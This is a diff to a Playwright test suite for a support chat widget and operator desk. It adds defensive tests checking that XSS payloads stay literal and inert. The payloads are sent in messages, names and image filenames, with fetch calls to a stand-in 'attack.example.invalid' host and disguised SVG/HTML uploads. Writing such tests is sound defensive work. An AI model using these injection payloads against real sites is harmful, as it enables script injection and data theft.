@@ -70,10 +70,10 @@ async function user(context, prefix = '/zh') {
   await page.locator('[data-support-open]').waitFor({ state: 'visible' });
   return page;
 }
-async function operator(context, prefix = '/zh') {
+async function operator(context, prefix = '/zh', name = 'Support tester') {
   const page = await context.newPage();
   await page.goto(base + portalPath(prefix) + '/');
-  await page.locator('#support-name').fill('Support tester');
+  await page.locator('#support-name').fill(name);
   await page.locator('#support-email').fill('support@example.invalid');
   await page.locator('[data-support-login-form] [type=submit]').click();
   await page.waitForURL(url => url.pathname.replace(/\/$/, '') === portalPath(prefix, true));
@@ -84,6 +84,26 @@ async function customerSend(page, text) {
   await page.locator('#support-widget [data-support-text]').fill(text);
   await page.locator('#support-widget [data-support-send]').click();
   await page.locator('#support-widget [data-support-message]').filter({ hasText: text }).waitFor();
+}
+
+// Observe both execution and attempted requests: blocking third-party traffic in
+// setup() alone must not make an injected network request look like a pass.
+async function chatAttackProbe(context) {
+  const requests = [], dialogs = [];
+  context.on('request', request => {
+    const url = new URL(request.url());
+    if (url.hostname.endsWith('example.invalid') || url.pathname === '/chat-probe') requests.push(request.url());
+  });
+  context.on('page', page => page.on('dialog', async dialog => { dialogs.push(dialog.message()); await dialog.dismiss(); }));
+  await context.addInitScript(() => { window.__chatAttack = 0; });
+  return { requests, dialogs };
+}
+async function assertInertChat(page, selector, probe) {
+  assert.equal(await page.evaluate(() => window.__chatAttack), 0, 'chat data never executes a payload');
+  const roots = page.locator(selector);
+  assert.equal(await roots.locator('script, iframe, object, embed, svg, [onerror], [onload], a[href]').count(), 0, 'chat data does not create executable HTML or clickable links');
+  assert.deepEqual(probe.requests, [], 'no attacker-domain or injected local image request is attempted');
+  assert.deepEqual(probe.dialogs, [], 'chat data does not open a script dialog');
 }
 
 test('predictable operator paths are absent for every locale and do not redirect', async () => {
@@ -383,5 +403,174 @@ test('operator drafts stay with their customer, send failures preserve attachmen
   await desk.locator('[data-support-search]').waitFor({ state: 'visible' });
   await desk.locator('[data-support-conversation=demo-alex]').click();
   await desk.locator('[data-support-message]').filter({ hasText: 'Only for Alex' }).waitFor();
+  assert.deepEqual(errors, []);
+});
+
+test('chat attack payloads and hostile names remain literal in both UIs after reopening and reloading', async t => {
+  if (!requirePortal(t)) return;
+  const { context, errors } = await setup(t);
+  const probe = await chatAttackProbe(context);
+  const customer = await user(context);
+  const customerName = '<svg onload=window.__chatAttack++>';
+  await customer.evaluate(() => { location.hash = '#/settings/0'; });
+  await customer.locator('[data-form=profile] [name=name]').fill(customerName);
+  await customer.locator('[data-form=profile] .btn.pri').click();
+  await customer.waitForFunction(() => document.querySelector('#fx')?.getAttribute('aria-busy') !== 'true');
+  await customer.locator('[data-support-open]').click();
+  const payloads = [
+    '<script>window.__chatAttack++;fetch("https://attack.example.invalid/script")</script>',
+    '<img src="/chat-probe" onerror="window.__chatAttack++">',
+    `<svg onload="window.__chatAttack++;fetch('https://attack.example.invalid/svg')"></svg>`,
+    '</p><iframe src="https://attack.example.invalid/frame"></iframe><p>',
+    'javascript:window.__chatAttack++',
+    '[打开附件](javascript:window.__chatAttack++) [查看订单](https://attack.example.invalid/markdown)',
+  ];
+  for (const payload of payloads) await customerSend(customer, payload);
+  const agentName = '<img src=x onerror=window.__chatAttack++>';
+  const desk = await operator(context, '/zh', agentName);
+  const selectCustomer = () => desk.locator('[data-support-conversation]').filter({ hasText: 'customer@example.invalid' }).click();
+  await selectCustomer();
+  const customerScope = '#support-widget [data-support-messages]';
+  const deskScope = '[data-support-messages], .support-conversation-content, [data-support-agent-name], [data-support-customer-name], [data-support-detail-name]';
+  await desk.waitForFunction(name => document.querySelector('[data-support-customer-name]')?.textContent === name, customerName);
+  assert.equal(await desk.locator('[data-support-agent-name]').textContent(), agentName);
+  assert.equal(await desk.locator('[data-support-detail-name]').textContent(), customerName);
+  assert.equal(await desk.locator('[data-support-conversation] .support-conversation-name strong').textContent(), customerName);
+  assert.deepEqual(await desk.locator('[data-support-message][data-sender=user] .support-message-body p').allTextContents(), payloads);
+  for (const payload of payloads) {
+    await desk.locator('[data-support-text]').fill(payload);
+    await desk.locator('[data-support-send]').click();
+    await desk.locator('[data-support-message][data-sender=agent]').filter({ hasText: payload }).waitFor();
+  }
+  await customer.locator('[data-support-message][data-sender=agent]').nth(payloads.length - 1).waitFor();
+  assert.deepEqual(await customer.locator('[data-support-message][data-sender=agent] .support-message-body p').allTextContents(), payloads);
+  await assertInertChat(customer, customerScope, probe);
+  await assertInertChat(desk, deskScope, probe);
+  await customer.locator('[data-support-close]').click();
+  await customer.locator('[data-support-open]').click();
+  await customer.reload();
+  await customer.locator('[data-support-open]').click();
+  await desk.reload();
+  await selectCustomer();
+  for (const page of [customer, desk]) {
+    for (const sender of ['user', 'agent']) {
+      assert.deepEqual(await page.locator(`[data-support-message][data-sender=${sender}] .support-message-body p`).allTextContents(), payloads, 'persisted payloads stay literal when read again');
+    }
+  }
+  assert.equal(await desk.locator('[data-support-agent-name]').textContent(), agentName);
+  assert.equal(await desk.locator('[data-support-detail-name]').textContent(), customerName);
+  await assertInertChat(customer, customerScope, probe);
+  await assertInertChat(desk, deskScope, probe);
+  assert.deepEqual(errors, []);
+});
+
+test('hostile image filenames stay literal in attachment previews, both chats and reopened image viewers', async t => {
+  if (!requirePortal(t)) return;
+  const { context, errors } = await setup(t);
+  const probe = await chatAttackProbe(context);
+  const customer = await user(context);
+  await customer.locator('[data-support-open]').click();
+  const filename = `<img src=x onerror="window.__chatAttack++">&'quoted'.png`;
+  await customer.locator('[data-support-file]').setInputFiles({ name: filename, mimeType: 'image/png', buffer: png });
+  await customer.locator('[data-support-preview]').waitFor({ state: 'visible' });
+  assert.equal(await customer.locator('[data-support-preview] img').getAttribute('alt'), filename);
+  assert.equal(await customer.locator('[data-support-preview] span').textContent(), filename);
+  await assertInertChat(customer, '[data-support-preview], [data-support-messages]', probe);
+  await customer.locator('[data-support-send]').click();
+  await customer.locator('[data-support-message] img').waitFor();
+  const desk = await operator(context);
+  const selectCustomer = () => desk.locator('[data-support-conversation]').filter({ hasText: 'customer@example.invalid' }).click();
+  await selectCustomer();
+  await desk.locator('[data-support-file]').setInputFiles({ name: filename, mimeType: 'image/png', buffer: png });
+  await desk.locator('[data-support-attachment]').waitFor({ state: 'visible' });
+  assert.equal(await desk.locator('[data-support-attachment-name]').textContent(), filename);
+  await assertInertChat(desk, '[data-support-attachment], [data-support-messages]', probe);
+  await desk.locator('[data-support-send]').click();
+  await customer.locator('[data-support-message][data-sender=agent] img').waitFor();
+  await assertInertChat(customer, '[data-support-preview], [data-support-messages]', probe);
+  await assertInertChat(desk, '[data-support-attachment], [data-support-messages]', probe);
+  for (const page of [customer, desk]) {
+    await page.reload();
+    if (page === customer) await page.locator('[data-support-open]').click(); else await selectCustomer();
+    await page.locator('[data-support-message] img').nth(1).waitFor();
+    const scope = '[data-support-messages], [data-support-preview], [data-support-attachment], .support-image-viewer';
+    assert.deepEqual(await page.locator('[data-support-image] span').allTextContents(), [filename, filename]);
+    for (let index = 0; index < 2; index++) {
+      const image = page.locator('[data-support-image] img').nth(index);
+      assert.equal(await image.getAttribute('alt'), filename);
+      await page.locator('[data-support-image]').nth(index).click();
+      await page.locator('.support-image-viewer').waitFor({ state: 'visible' });
+      assert.equal(await page.locator('.support-image-viewer img').getAttribute('alt'), filename);
+      assert.equal(await page.locator('.support-image-viewer img').evaluate(image => image.naturalWidth), 1);
+      await assertInertChat(page, scope, probe);
+      await page.keyboard.press('Escape');
+      await page.locator('.support-image-viewer').waitFor({ state: 'hidden' });
+    }
+    await assertInertChat(page, scope, probe);
+  }
+  assert.deepEqual(errors, []);
+});
+
+test('SVG, HTML, corrupt bytes and oversized headers disguised as supported images are rejected without losing either composer draft', async t => {
+  if (!requirePortal(t)) return;
+  const { context, errors } = await setup(t);
+  const probe = await chatAttackProbe(context);
+  const customer = await user(context);
+  await customer.locator('[data-support-open]').click();
+  await customerSend(customer, '已有记录必须保留');
+  const desk = await operator(context);
+  await desk.locator('[data-support-conversation]').filter({ hasText: 'customer@example.invalid' }).click();
+  const maliciousBytes = [
+    Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="window.__chatAttack++"><image href="https://attack.example.invalid/svg-upload"/></svg>'),
+    Buffer.from('<html><script>window.__chatAttack++;fetch("https://attack.example.invalid/html-upload")</script></html>'),
+    png.subarray(0, 20),
+    // A tiny PNG with a valid IHDR CRC claiming 5001 × 5001 pixels. Reject
+    // the header without needing to create or decode a large image fixture.
+    Buffer.from('iVBORw0KGgoAAAANSUhEUgAAE4kAABOJCAIAAAD2ZKgHAAAADElEQVR4nGM4k+kBAAOCAX62ByEmAAAAAElFTkSuQmCC', 'base64'),
+  ];
+  for (const page of [customer, desk]) {
+    const prefix = page === customer ? '#support-widget ' : '';
+    const attachment = page.locator(prefix + (page === customer ? '[data-support-preview]' : '[data-support-attachment]'));
+    const draft = page === customer ? '用户的有效草稿' : '客服的有效草稿';
+    await page.locator(prefix + '[data-support-text]').fill(draft);
+    await page.locator(prefix + '[data-support-file]').setInputFiles({ name: 'retained.png', mimeType: 'image/png', buffer: png });
+    await attachment.waitFor({ state: 'visible' });
+    const originalImage = await attachment.locator('img').getAttribute('src');
+    const messageCount = await page.locator('[data-support-message]').count();
+    // Install the spy after the legitimate image has finished preparing. Invalid
+    // replacements must fail their metadata check before entering image decode.
+    await page.evaluate(() => {
+      window.__originalChatImageDecode = HTMLImageElement.prototype.decode;
+      window.__chatImageDecodeCalls = 0;
+      HTMLImageElement.prototype.decode = function (...args) {
+        window.__chatImageDecodeCalls++;
+        return window.__originalChatImageDecode.apply(this, args);
+      };
+    });
+    for (const type of ['image/png', 'image/jpeg', 'image/webp']) {
+      for (const [index, buffer] of maliciousBytes.entries()) {
+        await page.locator(prefix + '[data-support-file]').setInputFiles({ name: `disguised-${index}.${type.split('/')[1]}`, mimeType: type, buffer });
+        await page.locator(prefix + '[data-support-error]').filter({ hasText: 'PNG' }).waitFor();
+        await page.waitForFunction(prefix => !document.querySelector(prefix + '[data-support-send]').disabled, prefix);
+        assert.equal(await page.locator(prefix + '[data-support-text]').inputValue(), draft);
+        assert.equal(await attachment.isVisible(), true, 'previous valid attachment survives the rejected replacement');
+        assert.equal(await attachment.locator('img').getAttribute('src'), originalImage);
+        assert.equal(await page.locator('[data-support-message]').count(), messageCount, 'rejected upload does not add or remove messages');
+        assert.equal(await page.evaluate(() => window.__chatImageDecodeCalls), 0, 'invalid or oversized image metadata is rejected before Image.decode is called');
+        await assertInertChat(page, prefix + '[data-support-messages], ' + prefix + '[data-support-preview], ' + prefix + '[data-support-attachment]', probe);
+      }
+    }
+    await page.evaluate(() => { HTMLImageElement.prototype.decode = window.__originalChatImageDecode; });
+    await page.locator(prefix + '[data-support-send]').click();
+    await page.locator('[data-support-message]').filter({ hasText: draft }).waitFor();
+    const sent = page.locator('[data-support-message]').filter({ hasText: draft });
+    assert.equal(await sent.locator('img').getAttribute('alt'), 'retained.png');
+    assert.equal(await sent.locator('img').getAttribute('src'), originalImage);
+    await customer.locator('[data-support-message]').filter({ hasText: draft }).waitFor();
+  }
+  await customer.reload();
+  await customer.locator('[data-support-open]').click();
+  assert.equal(await customer.locator('[data-support-message]').count(), 3, 'only the original message and two valid retained drafts are persisted');
+  assert.equal(await customer.locator('[data-support-message] img').count(), 2);
   assert.deepEqual(errors, []);
 });
